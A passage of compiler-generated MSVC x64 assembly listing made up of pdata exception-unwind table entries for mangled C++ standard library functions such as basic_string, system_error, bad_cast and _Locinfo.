$pdata$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+69
	DD	imagerel $unwind$?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+88
	DD	imagerel $unwind$?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+187
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+46
	DD	imagerel $unwind$?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+102
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+80
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+126
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN5
	DD	imagerel $LN5+236
	DD	imagerel $unwind$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+110
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN3
	DD	imagerel $LN3+96
	DD	imagerel $unwind$?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+146
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+189
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD imagerel $LN4
	DD	imagerel $LN4+62
	DD	imagerel $unwind$??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1runtime_error@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1runtime_error@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0runtime_error@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0runtime_error@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gruntime_error@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gruntime_error@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?iostream_category@std@@YAAEBVerror_category@1@XZ DD imagerel $LN3
	DD	imagerel $LN3+14
	DD	imagerel $unwind$?iostream_category@std@@YAAEBVerror_category@1@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+62
	DD	imagerel $unwind$?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z DD imagerel $LN5
	DD	imagerel $LN5+93
	DD	imagerel $unwind$?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??8error_category@std@@QEBA_NAEBV01@@Z DD imagerel $LN5
	DD	imagerel $LN5+59
	DD	imagerel $unwind$??8error_category@std@@QEBA_NAEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+102
	DD	imagerel $unwind$?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??8std@@YA_NAEBVerror_condition@0@0@Z DD imagerel $LN5
	DD	imagerel $LN5+122
	DD	imagerel $unwind$??8std@@YA_NAEBVerror_condition@0@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DD imagerel $LN8
	DD	imagerel $LN8+206
	DD	imagerel $unwind$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA DD imagerel ?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
	DD	imagerel ?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA DD imagerel ?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
	DD	imagerel ?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD imagerel $LN6
	DD	imagerel $LN6+241
	DD	imagerel $unwind$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA DD imagerel ?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA
	DD	imagerel ?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_System_error@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1_System_error@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_System_error@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$??0_System_error@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G_System_error@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G_System_error@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z DD imagerel $LN5
	DD	imagerel $LN5+158
	DD	imagerel $unwind$??0system_error@std@@QEAA@Verror_code@1@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA DD imagerel ?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA
	DD	imagerel ?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1system_error@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1system_error@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0system_error@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0system_error@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gsystem_error@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gsystem_error@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z DD imagerel $LN7
	DD	imagerel $LN7+129
	DD	imagerel $unwind$?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Iostream_error_category2@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1_Iostream_error_category2@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G_Iostream_error_category2@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G_Iostream_error_category2@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_cast@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$??0bad_cast@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_cast@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1bad_cast@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_cast@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0bad_cast@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_cast@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gbad_cast@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_cast@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+36
	DD	imagerel $unwind$?_Throw_bad_cast@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G_Facet_base@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G_Facet_base@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Locinfo@std@@QEAA@PEBD@Z DD imagerel $LN12
	DD	imagerel $LN12+186
	DD	imagerel $unwind$??0_Locinfo@std@@QEAA@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA DD imagerel ?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
	DD	imagerel ?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA+28
	DD	imagerel $unwind$?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Locinfo@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+140
	DD	imagerel $unwind$??1_Locinfo@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ DD imagerel $LN3
	DD	imagerel $LN3+82
	DD	imagerel $unwind$?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ DD imagerel $LN3
	DD	imagerel $LN3+122
	DD	imagerel $unwind$?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ DD imagerel $LN3
	DD	imagerel $LN3+19
	DD	imagerel $unwind$?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Yarn@D@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1?$_Yarn@D@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@?$_Yarn@D@std@@QEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+56
	DD	imagerel $unwind$?c_str@?$_Yarn@D@std@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$_Yarn@D@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+50
	DD	imagerel $unwind$?_Tidy@?$_Yarn@D@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
